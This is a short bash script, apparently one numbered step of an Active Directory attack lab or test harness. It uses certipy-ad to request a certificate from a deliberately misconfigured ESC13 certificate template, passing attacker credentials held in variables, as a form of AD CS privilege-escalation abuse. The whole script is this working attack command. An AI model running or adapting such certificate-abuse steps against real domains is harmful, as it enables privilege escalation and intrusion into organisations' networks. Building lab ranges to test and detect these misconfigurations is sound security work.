#!/bin/bash
# CONFIGURED—CA cadre-CA running, ESC13 issuance policy linked
source "$(dirname "$0")/../lib/cadre-env.sh"
source "$(dirname "$0")/../lib/common.sh"

start_attack "060" "ESC13 — CA template with Subject/Policies attribute"

require_tool certipy-ad

log "Requesting certificate with CADRE-ESC13 template"
run_cmd "certipy-ad req -ca $CA_NAME -template CADRE-ESC13 -u $ATTACK_USER@$DOMAIN_ROOT -p '$ATTACK_PASS' -dc-ip $DC01"
result $? "ESC13 — certificate request"
